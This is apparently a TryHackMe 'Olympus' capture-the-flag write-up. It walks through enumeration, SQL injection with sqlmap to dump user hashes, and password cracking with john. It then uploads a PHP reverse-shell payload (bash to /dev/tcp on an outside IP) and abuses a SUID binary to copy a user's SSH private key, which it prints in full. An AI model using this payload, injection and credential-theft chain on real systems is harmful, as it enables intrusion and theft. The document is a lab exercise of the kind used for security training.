<img width="1129" height="155" alt="image" src="https://github.com/user-attachments/assets/e1fa8969-70ca-41c0-a17c-38a792c7bab4" /># TryHackMe Olympus Writeup

---

## Nmap Scan 

```
nmap -sCV -Pn 10.113.153.151
```

```ruby
Nmap scan report for 10.113.153.151
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b9:5f:70:a4:64:b0:fe:2e:e4:4b:14:f4:93:97:28:89 (RSA)
|   256 40:80:33:87:00:11:3a:6a:6b:e2:b1:e8:23:aa:7d:9e (ECDSA)
|_  256 ce:92:f9:3a:c3:31:97:ae:7f:91:5e:7d:82:07:d0:52 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.54 seconds

```


## Gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm
```

<img width="773" height="545" alt="image" src="https://github.com/user-attachments/assets/4b629a6f-3065-4647-8075-a623342336f6" />


## in **`/~webmaster`** found cms call **`victor cms`**

<img width="1682" height="654" alt="image" src="https://github.com/user-attachments/assets/579aa4ba-26a8-4c49-bd72-a5f2edc73f7c" />

## i search for vulns in it and found 

```
searchsploit victor cms
```

<img width="1483" height="286" alt="image" src="https://github.com/user-attachments/assets/c43e0224-e6fb-47cb-b72d-ec825bd834d2" />

## let's get file of file upload exploit and try it 

```
searchsploit -m 48490
```

<img width="1548" height="636" alt="image" src="https://github.com/user-attachments/assets/470c6d36-212c-4768-a4de-c28042894c6d" />

## in output i found  

<img width="955" height="199" alt="image" src="https://github.com/user-attachments/assets/c65302da-7d9d-48f4-9fcf-eec08b52a1fe" />

## let's try to see all users 

```
POST /~webmaster/admin/users.php?source=View_All_Users HTTP/1.1
```

> ## and we found all users even user **`test`** that we added

<img width="931" height="290" alt="image" src="https://github.com/user-attachments/assets/1af4a149-6770-43de-89d3-20eafbba120c" />

## to complete exploit 

<img width="787" height="100" alt="image" src="https://github.com/user-attachments/assets/5f6baa43-a15f-4d93-a57c-3b8188cea760" />

## but when i try to do that i get 403

<img width="1242" height="206" alt="image" src="https://github.com/user-attachments/assets/8c150969-c51a-4a3f-8653-f2f340b84265" />



--------------------------------------------------------

## i navgate the website and found login form and i try to do sqli on it and it work 

```
sqlmap -r request.txt  --tables --dump 
```

<img width="1326" height="353" alt="image" src="https://github.com/user-attachments/assets/161aaf69-2065-4423-9b5b-74f7b7864cb3" />

## if found these databases 

<img width="1200" height="161" alt="image" src="https://github.com/user-attachments/assets/20ecf4c8-ffd8-417d-919a-e7317b3d190c" />

```
databases:
- mysql
- information_schema
- performance_schema
- sys
- phpmyadmin
- olympus  
```

---

## let's find what tables names in **`olympus`** db

```
sqlmap -r request.txt --batch --tables olympus
```

<img width="899" height="374" alt="image" src="https://github.com/user-attachments/assets/fd7ef224-17e9-45b1-8a91-ee7b0e5442a7" />

```
olympus:
- categories
- chats
- comments
- flag
- posts
- users
```

## let's get usernames and passwords

```
sqlmap -r search.req -D olympus -T users -C user_email,user_name,user_password,user_role --dump
```

```
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```


## now i will crack hashes with jhon

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1002" height="237" alt="image" src="https://github.com/user-attachments/assets/1f575228-af77-4eb4-b031-2119b3ec0f34" />

```
summertime       (prometheus)   
```

<img width="1919" height="449" alt="image" src="https://github.com/user-attachments/assets/90399b8a-bfe2-4fa4-9ae1-29c2cf456431" />


> ## i notice in emails in database new subdomain let's add it to **`/etc/hosts`**

```
chat.olympus.thm
```

```
http://chat.olympus.thm/home.php
```

## found chat and there is option to upload file so maybe we can upload reveseshell but where this files uploaded

<img width="1632" height="792" alt="image" src="https://github.com/user-attachments/assets/ead32846-ff90-4ec8-b10c-9525a103bc16" />


## gobuster found **`uploads`**

```
 gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://chat.olympus.thm/ 
```

<img width="777" height="153" alt="image" src="https://github.com/user-attachments/assets/2fc5abfb-d8e1-4afa-a0af-61bf369da100" />

> ## but it empty 

<img width="1410" height="207" alt="image" src="https://github.com/user-attachments/assets/e5794835-4487-4e42-b0a2-6ab733d0c690" />


## i found it in **`Chat`** table in database the file that was uploaded in chat appear there but it uploaded with random name 

```
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.137.69/4444 0>&1'"); ?>
```

<img width="640" height="132" alt="image" src="https://github.com/user-attachments/assets/b05fa077-0958-469f-bacc-6b34b7c06e05" />

<img width="1348" height="212" alt="image" src="https://github.com/user-attachments/assets/80fa25a3-2add-42e1-bcc0-7a01c97b723b" />


## i uploaded this and i will go to db to find name of file then call it from **`http://chat.olympus.thm/uploads/<file_name>`**

<img width="1311" height="318" alt="image" src="https://github.com/user-attachments/assets/6a8b513c-af6e-4f71-9608-bd95896233bf" />

```
http://chat.olympus.thm/uploads/ea8853e8c68badb3a3c57a3dcd2641c1.php
```

<img width="1129" height="155" alt="image" src="https://github.com/user-attachments/assets/c36bd7c4-d0a1-439c-b1d0-f59ef7fd3939" />


## now try to privlage esc to zeus

> ## search for **`suid`** files permissions 

```
find / -perm -u=s -type f 2>/dev/null
```

<img width="1154" height="324" alt="image" src="https://github.com/user-attachments/assets/3cba2a97-7ed7-40f8-8b27-91a9c69d250d" />

## found an interesting file.

```
/usr/bin/cputils
```


<img width="1221" height="485" alt="image" src="https://github.com/user-attachments/assets/34241d14-9b11-4c1e-b7f1-156477629e49" />

> # oohh so the script copy file that we want to another file what if we copy file of id_rsa of zeus user 

<img width="1321" height="567" alt="image" src="https://github.com/user-attachments/assets/9e9fee73-f71b-430d-af8f-6e0d8ddcf5ae" />

> ## boom we get it now we will connect to ssh as zeus user 


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----

```























